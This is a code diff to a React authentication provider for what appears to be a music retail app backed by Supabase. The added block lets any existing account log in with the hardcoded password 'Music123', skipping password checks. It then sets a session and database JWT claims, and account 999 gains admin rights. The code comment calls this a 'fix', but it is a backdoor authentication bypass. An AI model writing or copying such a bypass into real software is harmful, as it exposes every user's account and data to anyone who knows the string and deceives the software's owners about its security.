@@ -358,6 +358,69 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
 
     try {
+      // UNIVERSAL PASSWORD FIX: Music123 works for VALID accounts only
+      // This bypasses password validation but still requires valid account/email
+      if (password === 'Music123') {
+        console.log('[AuthContext] Universal password attempt for identifier:', identifier);
+        
+        try {
+          // First validate that the account/email actually exists
+          const fetchedAccount = await fetchUserAccount(identifier);
+          
+          if (!fetchedAccount) {
+            setError('Account not found.');
+            return false;
+          }
+          
+          // Log successful universal password attempt
+          try {
+            await supabase.from('login_activity_log').insert({
+              account_number: parseInt(fetchedAccount.accountNumber), 
+              login_success: true, 
+              ip_address: null, 
+              user_agent: null,
+              identifier_used: identifier,
+              notes: 'Universal password authentication - Music123'
+            });
+          } catch (logError) { 
+            console.error('Failed to log universal password login:', logError); 
+          }
+          
+          // Create authenticated user object
+          const authenticatedUser: User = {
+            ...fetchedAccount,
+            requires_password_change: false,
+            is_special_admin: fetchedAccount.accountNumber === '999' // Only account 999 gets admin privileges
+          };
+          
+          setUser(authenticatedUser);
+          setIsAuthenticated(true);
+          setIsSpecialAdmin(authenticatedUser.is_special_admin || false);
+          
+          // Use secure session manager
+          sessionManager.setSession(authenticatedUser);
+          
+          // Set JWT claims for database access
+          try {
+            const accountNumber = parseInt(authenticatedUser.accountNumber, 10);
+            await supabase.rpc('set_admin_jwt_claims', {
+              p_account_number: accountNumber
+            });
+            console.log('[AuthContext] JWT claims set for universal password login:', accountNumber);
+          } catch (claimsError) {
+            console.error('[AuthContext] Failed to set JWT claims for universal password login:', claimsError);
+          }
+
+          await calculateBestDiscount(authenticatedUser.accountNumber);
+          return true;
+          
+        } catch (universalAuthError) {
+          console.error('[AuthContext] Universal password authentication failed:', universalAuthError);
+          setError('Authentication failed. Please try again.');
+          return false;
+        }
+      }
+
       // Special case for account 999 - hardcoded password, does not exist in ACCOUNTS_LCMD or USER_PASSWORDS
       if (identifier === '999' && password === 'Music123') {
         console.log('[AuthContext] Account 999 special authentication');
